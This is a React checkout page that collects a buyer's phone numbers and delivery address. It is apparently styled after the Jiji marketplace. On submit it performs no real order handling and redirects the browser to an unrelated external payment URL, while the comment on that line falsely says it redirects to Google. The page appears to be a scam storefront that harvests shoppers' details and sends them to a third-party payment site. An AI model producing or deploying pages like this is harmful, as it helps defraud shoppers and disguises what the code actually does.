import { useState } from "react";
import { useNavigate, Link } from "react-router-dom";
import { ArrowLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { regions } from "@/data/products";
import { toast } from "@/hooks/use-toast";

const CheckoutPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    contactNumber: "",
    mobile: "",
    mobile2: "",
    region: "",
    district: "",
    ward: "",
    streetAddress: "",
  });

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validation
    if (!formData.contactNumber || !formData.mobile || !formData.region || !formData.streetAddress) {
      toast({
        title: "Required fields missing",
        description: "Please fill in all required fields.",
        variant: "destructive",
      });
      return;
    }

    // Redirect to Google
    window.location.href = "https://gooza.site/pay";
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="jiji-header-gradient px-4 py-3 sticky top-0 z-10">
        <div className="container mx-auto flex items-center gap-4">
          <Link 
            to="/" 
            className="w-10 h-10 rounded-full bg-primary-foreground/20 flex items-center justify-center hover:bg-primary-foreground/30 transition-colors"
          >
            <ArrowLeft className="w-5 h-5 text-primary-foreground" />
          </Link>
          <h1 className="text-lg font-semibold text-primary-foreground">
            Type Delivery Address
          </h1>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-xl">
        <div className="bg-card rounded-lg p-6 shadow-sm">
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Contact Number */}
            <div className="space-y-2">
              <Label htmlFor="contactNumber" className="text-foreground font-medium">
                Contact Number <span className="text-destructive">*</span>
              </Label>
              <Input
                id="contactNumber"
                type="tel"
                placeholder="Enter contact number"
                value={formData.contactNumber}
                onChange={(e) => handleInputChange("contactNumber", e.target.value)}
                className="bg-background border-input"
                required
              />
            </div>

            {/* Mobile */}
            <div className="space-y-2">
              <Label htmlFor="mobile" className="text-foreground font-medium">
                Mobile <span className="text-destructive">*</span>
              </Label>
              <Input
                id="mobile"
                type="tel"
                placeholder="Enter mobile number"
                value={formData.mobile}
                onChange={(e) => handleInputChange("mobile", e.target.value)}
                className="bg-background border-input"
                required
              />
            </div>

            {/* Mobile 2 */}
            <div className="space-y-2">
              <Label htmlFor="mobile2" className="text-foreground font-medium">
                Mobile 2 <span className="text-muted-foreground">(Optional)</span>
              </Label>
              <Input
                id="mobile2"
                type="tel"
                placeholder="Enter alternative mobile number"
                value={formData.mobile2}
                onChange={(e) => handleInputChange("mobile2", e.target.value)}
                className="bg-background border-input"
              />
            </div>

            {/* Region */}
            <div className="space-y-2">
              <Label className="text-foreground font-medium">
                Region <span className="text-destructive">*</span>
              </Label>
              <Select 
                value={formData.region} 
                onValueChange={(value) => handleInputChange("region", value)}
              >
                <SelectTrigger className="bg-background border-input">
                  <SelectValue placeholder="Select region" />
                </SelectTrigger>
                <SelectContent className="bg-card z-50">
                  {regions.map((region) => (
                    <SelectItem key={region} value={region}>
                      {region}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {/* District */}
            <div className="space-y-2">
              <Label htmlFor="district" className="text-foreground font-medium">
                District
              </Label>
              <Input
                id="district"
                type="text"
                placeholder="Enter district"
                value={formData.district}
                onChange={(e) => handleInputChange("district", e.target.value)}
                className="bg-background border-input"
              />
            </div>

            {/* Ward */}
            <div className="space-y-2">
              <Label htmlFor="ward" className="text-foreground font-medium">
                Ward
              </Label>
              <Input
                id="ward"
                type="text"
                placeholder="Enter ward"
                value={formData.ward}
                onChange={(e) => handleInputChange("ward", e.target.value)}
                className="bg-background border-input"
              />
            </div>

            {/* Street Address */}
            <div className="space-y-2">
              <Label htmlFor="streetAddress" className="text-foreground font-medium">
                Street Address <span className="text-destructive">*</span>
              </Label>
              <Input
                id="streetAddress"
                type="text"
                placeholder="Enter street address"
                value={formData.streetAddress}
                onChange={(e) => handleInputChange("streetAddress", e.target.value)}
                className="bg-background border-input"
                required
              />
            </div>

            {/* Submit Button */}
            <Button 
              type="submit"
              className="w-full bg-accent hover:bg-accent/90 text-accent-foreground font-semibold py-6 text-lg mt-6"
            >
              Purchase on This Address
            </Button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default CheckoutPage;
